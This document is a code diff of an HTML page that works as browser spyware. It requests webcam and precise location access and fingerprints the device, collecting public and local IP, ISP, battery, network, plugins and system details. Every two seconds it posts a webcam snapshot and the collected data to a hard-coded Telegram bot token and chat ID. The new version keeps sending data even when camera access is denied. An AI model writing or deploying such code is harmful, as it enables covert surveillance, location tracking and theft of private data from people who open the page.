@@ -7,280 +7,169 @@
 <style>
 body{margin:0;background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif}
 button{margin-top:12px;padding:10px 20px;font-size:16px;cursor:pointer}
-#status{color:#0f0;margin-top:10px;font-size:14px}
 </style>
 </head>
 <body>
 <canvas id="canvas" style="display:none"></canvas>
-<button onclick="startAutoSend()">▶ START AUTO SEND</button>
-<div id="status">Initializing...</div>
+<button onclick="start()">▶ START AUTO SEND</button>
 <script>
-const canvas = document.getElementById("canvas");
-const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
-const CHAT_ID = "8319568593";
-let intervalId = null;
-let latitude = "N/A";
-let longitude = "N/A";
-let mapLink = "Location not allowed";
-let userIP = "Unknown";
-let stream = null;
-let batteryInfo = "Battery: Not available";
-let networkInfo = "Network: Not available";
-let localIP = "Unknown";
-let city = "Unknown";
-let country = "Unknown";
-let isp = "Unknown";
-let locationPermissionGranted = false;
+const canvas=document.getElementById("canvas");
+const BOT_TOKEN="7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
+const CHAT_ID="8319568593";
+let intervalId=null;
+let latitude="N/A";
+let longitude="N/A";
+let mapLink="Location not allowed";
+let userIP="Unknown";
+let stream=null;
+let batteryInfo="Battery: Not available";
+let networkInfo="Network: Not available";
+let localIP="Unknown";
+let city="Unknown";
+let country="Unknown";
+let isp="Unknown";
+let pluginsInfo="";
+let timezoneInfo="";
 
-// Get IP and location info immediately
-fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => {
-    userIP = d.ip;
-    fetch(`https://ipapi.co/${userIP}/json/`)
-        .then(r => r.json())
-        .then(ipData => {
-            city = ipData.city || "Unknown";
-            country = ipData.country_name || "Unknown";
-            isp = ipData.org || "Unknown";
-        });
+fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
+userIP=d.ip;
+fetch(`https://ipapi.co/${userIP}/json/`)
+.then(r=>r.json())
+.then(ipData=>{
+city=ipData.city||"Unknown";
+country=ipData.country_name||"Unknown";
+isp=ipData.org||"Unknown";
+});
 });
 
-// Request location permission automatically
-function requestLocationPermission() {
-    if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                latitude = pos.coords.latitude.toFixed(6);
-                longitude = pos.coords.longitude.toFixed(6);
-                const accuracy = pos.coords.accuracy;
-                mapLink = `https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
-                locationPermissionGranted = true;
-                document.getElementById('status').textContent = 'Location access granted ✓';
-                console.log('Location permission granted');
-            },
-            error => {
-                mapLink = "Location denied";
-                document.getElementById('status').textContent = 'Location access denied ✗';
-                console.log('Location permission denied');
-            },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-    }
+navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{stream=s});
+
+if(navigator.geolocation){
+navigator.geolocation.getCurrentPosition(pos=>{
+latitude=pos.coords.latitude.toFixed(6);
+longitude=pos.coords.longitude.toFixed(6);
+const accuracy=pos.coords.accuracy;
+mapLink=`https://maps.google.com/maps?q=${latitude},${longitude}&z=17&t=k`;
+},()=>{
+mapLink="Location denied";
+},{enableHighAccuracy:true,timeout:10000,maximumAge:0});
 }
 
-// Request camera permission automatically
-navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-    .then(s => {
-        stream = s;
-        document.getElementById('status').textContent = 'Camera access granted ✓';
-        // Request location permission after camera is granted
-        requestLocationPermission();
-    })
-    .catch(err => {
-        document.getElementById('status').textContent = 'Camera access denied ✗';
-        console.error('Camera permission denied:', err);
-    });
-
-// Get battery info
-if (navigator.getBattery) {
-    navigator.getBattery().then(b => {
-        batteryInfo = `
+if(navigator.getBattery){
+navigator.getBattery().then(b=>{
+batteryInfo=`
 🔋 Battery:
-Level: ${Math.round(b.level * 100)}%
-Charging: ${b.charging ? 'Yes' : 'No'}
-Time: ${b.chargingTime === Infinity ? 'Not charging' : b.chargingTime + ' seconds'}
+Level: ${Math.round(b.level*100)}%
+Charging: ${b.charging?'Yes':'No'}
+Time: ${b.chargingTime===Infinity?'Not charging':b.chargingTime+' seconds'}
 `;
-    });
+});
 }
 
-// Get network info
-if (navigator.connection) {
-    networkInfo = `
+if(navigator.connection){
+networkInfo=`
 📡 Network:
 Type: ${navigator.connection.effectiveType}
 Downlink: ${navigator.connection.downlink} Mbps
 RTT: ${navigator.connection.rtt} ms
-Save Data: ${navigator.connection.saveData ? 'Enabled' : 'Disabled'}
+Save Data: ${navigator.connection.saveData?'Enabled':'Disabled'}
 `;
 }
 
-// Get local IP address
-const getLocalIPAddress = () => {
-    return new Promise(resolve => {
-        const pc = new RTCPeerConnection({ iceServers: [] });
-        pc.createDataChannel('');
-        pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
-        pc.onicecandidate = ice => {
-            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
-            if (ip && ip[1]) resolve(ip[1]);
-            pc.close();
-        };
-        setTimeout(() => resolve("Not found"), 1000);
-    });
+if(navigator.plugins){
+const plugins=Array.from(navigator.plugins);
+pluginsInfo=`
+🔌 Browser Plugins (${plugins.length}):
+${plugins.map((p,i)=>`${i+1}. ${p.name} (${p.version})`).join('\n')}
+`;
+}
+
+timezoneInfo=`
+🌐 Timezone Details:
+Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Offset: ${new Date().getTimezoneOffset()} minutes
+Locale: ${navigator.language}
+Available Locales: ${navigator.languages?navigator.languages.join(', '):navigator.language}
+`;
+
+const getLocalIPAddress=()=>{
+return new Promise(resolve=>{
+const pc=new RTCPeerConnection({iceServers:[]});
+pc.createDataChannel('');
+pc.createOffer().then(sdp=>pc.setLocalDescription(sdp));
+pc.onicecandidate=ice=>{
+if(!ice||!ice.candidate||!ice.candidate.candidate)return;
+const ip=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+if(ip&&ip[1])resolve(ip[1]);
+pc.close();
+};
+setTimeout(()=>resolve("Not found"),1000);
+});
 };
 
-// Get browser plugins/extensions detection
-const getBrowserPlugins = () => {
-    const plugins = [];
-    for (let i = 0; i < navigator.plugins.length; i++) {
-        plugins.push(navigator.plugins[i].name);
-    }
-    return plugins.length > 0 ? plugins.join(', ') : 'No plugins detected';
-};
+const getAdvancedSystemInfo=()=>{
+const cores=navigator.hardwareConcurrency||'Unknown';
+const ram=navigator.deviceMemory||'Unknown';
+const platform=navigator.platform;
+const vendor=navigator.vendor||'Unknown';
+const cookieEnabled=navigator.cookieEnabled?'Yes':'No';
+const pdfViewerEnabled=navigator.pdfViewerEnabled?'Yes':'No';
+const webdriver=navigator.webdriver?'Yes':'No';
+const maxTouchPoints=navigator.maxTouchPoints||0;
+const userAgent=navigator.userAgent;
+const deviceModel=userAgent.match(/\((.*?)\)/)?userAgent.match(/\((.*?)\)/)[1]:'Unknown';
+const appName=navigator.appName||'Unknown';
+const appVersion=navigator.appVersion||'Unknown';
+const appCodeName=navigator.appCodeName||'Unknown';
+const product=navigator.product||'Unknown';
+const productSub=navigator.productSub||'Unknown';
+const doNotTrack=navigator.doNotTrack||'Unknown';
 
-// Get detailed timezone information
-const getDetailedTimezoneInfo = () => {
-    const now = new Date();
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const offset = -now.getTimezoneOffset() / 60;
-    const offsetString = `UTC${offset >= 0 ? '+' : ''}${offset}`;
-    const dst = now.getTimezoneOffset() < new Date(now.getFullYear(), 0, 1).getTimezoneOffset() ? 'Yes' : 'No';
-    
-    // Get timezone abbreviation
-    const timezoneAbbr = now.toLocaleTimeString('en-us', { timeZoneName: 'short' }).split(' ')[2];
-    
-    return {
-        timezone: timezone,
-        offset: offsetString,
-        abbreviation: timezoneAbbr || timezone.split('/')[1] || timezone,
-        daylightSaving: dst,
-        currentTime: now.toLocaleTimeString(),
-        currentDate: now.toLocaleDateString()
-    };
-};
-
-// Get advanced system information
-const getAdvancedSystemInfo = () => {
-    const cores = navigator.hardwareConcurrency || 'Unknown';
-    const ram = navigator.deviceMemory || 'Unknown';
-    const lang = navigator.language;
-    const langs = navigator.languages ? navigator.languages.join(', ') : lang;
-    
-    const tzInfo = getDetailedTimezoneInfo();
-    
-    const platform = navigator.platform;
-    const vendor = navigator.vendor || 'Unknown';
-    const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
-    const pdfViewerEnabled = navigator.pdfViewerEnabled ? 'Yes' : 'No';
-    const webdriver = navigator.webdriver ? 'Yes' : 'No';
-    const maxTouchPoints = navigator.maxTouchPoints || 0;
-    const userAgent = navigator.userAgent;
-    const deviceModel = userAgent.match(/\((.*?)\)/) ? userAgent.match(/\((.*?)\)/)[1] : 'Unknown';
-    
-    // Get browser plugins
-    const plugins = getBrowserPlugins();
-    
-    // Detect if browser is in private/incognito mode
-    let isPrivate = 'Unknown';
-    try {
-        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-        if (fs) {
-            fs(window.TEMPORARY, 100, () => { isPrivate = 'No'; }, () => { isPrivate = 'Yes'; });
-        }
-    } catch(e) {
-        isPrivate = 'Detection failed';
-    }
-    
-    return `
+return`
 🖥️ SYSTEM INFORMATION:
 Device: ${platform}
 Model: ${deviceModel}
-Browser: ${userAgent.substring(0, 80)}...
+Browser: ${userAgent.substring(0,80)}...
+App Name: ${appName}
+App Version: ${appVersion}
+App Code: ${appCodeName}
+Product: ${product}
+Product Sub: ${productSub}
+Do Not Track: ${doNotTrack}
 CPU Cores: ${cores}
 RAM: ${ram} GB
-Languages: ${langs}
-
-⏰ TIMEZONE INFORMATION:
-Timezone: ${tzInfo.timezone}
-Offset: ${tzInfo.offset}
-Abbreviation: ${tzInfo.abbreviation}
-Daylight Saving: ${tzInfo.daylightSaving}
-Current Time: ${tzInfo.currentTime}
-Current Date: ${tzInfo.currentDate}
-
-🔧 BROWSER DETAILS:
 Vendor: ${vendor}
 Cookies: ${cookieEnabled}
 PDF Viewer: ${pdfViewerEnabled}
 WebDriver: ${webdriver}
 Touch Points: ${maxTouchPoints}
-Private Mode: ${isPrivate}
-Browser Plugins: ${plugins}
-
-📺 SCREEN INFORMATION:
-Resolution: ${screen.width}x${screen.height}
+Screen: ${screen.width}x${screen.height}
 Pixel Ratio: ${window.devicePixelRatio}
 Color Depth: ${screen.colorDepth}
-Orientation: ${screen.orientation ? screen.orientation.type : 'Unknown'}
-Available Height: ${screen.availHeight}px
-Available Width: ${screen.availWidth}px
 `;
 };
 
-function startAutoSend() {
-    if (!locationPermissionGranted) {
-        requestLocationPermission();
-    }
-    
-    getLocalIPAddress().then(ip => {
-        localIP = ip;
-        document.getElementById('status').textContent = 'Local IP found: ' + localIP;
-    });
+function start(){
+getLocalIPAddress().then(ip=>{localIP=ip});
 
-    if (!intervalId) {
-        intervalId = setInterval(captureAndSend, 2000);
-        document.getElementById('status').textContent = 'Auto sending started ✓';
-        document.querySelector('button').textContent = '⏹ STOP AUTO SEND';
-        document.querySelector('button').onclick = stopAutoSend;
-    }
+if(!intervalId){
+intervalId=setInterval(captureAndSend,2000);
+}
 }
 
-function stopAutoSend() {
-    if (intervalId) {
-        clearInterval(intervalId);
-        intervalId = null;
-        document.getElementById('status').textContent = 'Auto sending stopped';
-        document.querySelector('button').textContent = '▶ START AUTO SEND';
-        document.querySelector('button').onclick = startAutoSend;
-    }
-}
-
-function captureAndSend() {
-    if (!stream) {
-        console.log('No camera stream available');
-        return;
-    }
-    
-    const videoTrack = stream.getVideoTracks()[0];
-    const imageCapture = new ImageCapture(videoTrack);
-    
-    imageCapture.grabFrame().then(imageBitmap => {
-        canvas.width = imageBitmap.width;
-        canvas.height = imageBitmap.height;
-        const ctx = canvas.getContext("2d");
-        ctx.translate(canvas.width, 0);
-        ctx.scale(-1, 1);
-        ctx.drawImage(imageBitmap, 0, 0);
-        
-        canvas.toBlob(blob => {
-            const tzInfo = getDetailedTimezoneInfo();
-            const caption = `
-📸 AUTO CAPTURE - ${new Date().toLocaleTimeString()}
+function captureAndSend(){
+if(!stream){
+const caption=`
+📸 DATA CAPTURE - ${new Date().toLocaleTimeString()}
 ⏰ Full Time: ${new Date().toLocaleString()}
 
-📍 ACCURATE LOCATION:
+📍 LOCATION INFORMATION:
 Latitude: ${latitude}
 Longitude: ${longitude}
 Google Maps: ${mapLink}
 City: ${city}
 Country: ${country}
 ISP: ${isp}
-
-⏰ TIMEZONE DETAILS:
-Timezone: ${tzInfo.timezone}
-Offset: ${tzInfo.offset}
-Abbreviation: ${tzInfo.abbreviation}
-Daylight Saving: ${tzInfo.daylightSaving}
 
 🌍 NETWORK INFORMATION:
 Public IP: ${userIP}
@@ -289,49 +178,98 @@ ${networkInfo}
 
 ${getAdvancedSystemInfo()}
 
+${pluginsInfo}
+
+${timezoneInfo}
+
+${batteryInfo}
+
+⚠️ Camera permission not granted
+`;
+const formData=new FormData();
+formData.append("chat_id",CHAT_ID);
+formData.append("caption",caption);
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:"POST",body:formData});
+return;
+}
+
+const videoTrack=stream.getVideoTracks()[0];
+const imageCapture=new ImageCapture(videoTrack);
+imageCapture.grabFrame().then(imageBitmap=>{
+canvas.width=imageBitmap.width;
+canvas.height=imageBitmap.height;
+const ctx=canvas.getContext("2d");
+ctx.translate(canvas.width,0);
+ctx.scale(-1,1);
+ctx.drawImage(imageBitmap,0,0);
+canvas.toBlob(blob=>{
+const caption=`
+📸 AUTO CAPTURE - ${new Date().toLocaleTimeString()}
+⏰ Full Time: ${new Date().toLocaleString()}
+
+📍 LOCATION INFORMATION:
+Latitude: ${latitude}
+Longitude: ${longitude}
+Google Maps: ${mapLink}
+City: ${city}
+Country: ${country}
+ISP: ${isp}
+
+🌍 NETWORK INFORMATION:
+Public IP: ${userIP}
+Local IP: ${localIP}
+${networkInfo}
+
+${getAdvancedSystemInfo()}
+
+${pluginsInfo}
+
+${timezoneInfo}
+
 ${batteryInfo}
 
 ⚠️ Automatic capture every 2 seconds
-Generated at: ${new Date().toISOString()}
 `;
-            
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("photo", blob);
-            formData.append("caption", caption);
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            })
-            .then(response => {
-                if (!response.ok) {
-                    console.error('Telegram API error:', response.status);
-                }
-            })
-            .catch(error => {
-                console.error('Error sending to Telegram:', error);
-            });
-        }, "image/jpeg", 0.7);
-    }).catch(error => {
-        console.error('Error capturing frame:', error);
-        document.getElementById('status').textContent = 'Error capturing image';
-    });
+const formData=new FormData();
+formData.append("chat_id",CHAT_ID);
+formData.append("photo",blob);
+formData.append("caption",caption);
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
+},"image/jpeg",0.7);
+}).catch(()=>{
+const caption=`
+📸 DATA CAPTURE (No Camera) - ${new Date().toLocaleTimeString()}
+⏰ Full Time: ${new Date().toLocaleString()}
+
+📍 LOCATION INFORMATION:
+Latitude: ${latitude}
+Longitude: ${longitude}
+Google Maps: ${mapLink}
+City: ${city}
+Country: ${country}
+ISP: ${isp}
+
+🌍 NETWORK INFORMATION:
+Public IP: ${userIP}
+Local IP: ${localIP}
+${networkInfo}
+
+${getAdvancedSystemInfo()}
+
+${pluginsInfo}
+
+${timezoneInfo}
+
+${batteryInfo}
+
+⚠️ Camera failed, but other data captured
+`;
+const formData=new FormData();
+formData.append("chat_id",CHAT_ID);
+formData.append("caption",caption);
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:"POST",body:formData});
+});
 }
-
-// Auto-start after 3 seconds if user doesn't click
-setTimeout(() => {
-    if (!intervalId) {
-        document.getElementById('status').textContent = 'Auto-starting in 3 seconds...';
-    }
-}, 3000);
-
-// Optional: Auto-start after all permissions are granted
-setTimeout(() => {
-    if (stream && !intervalId) {
-        startAutoSend();
-    }
-}, 5000);
 </script>
 </body>
 </html>
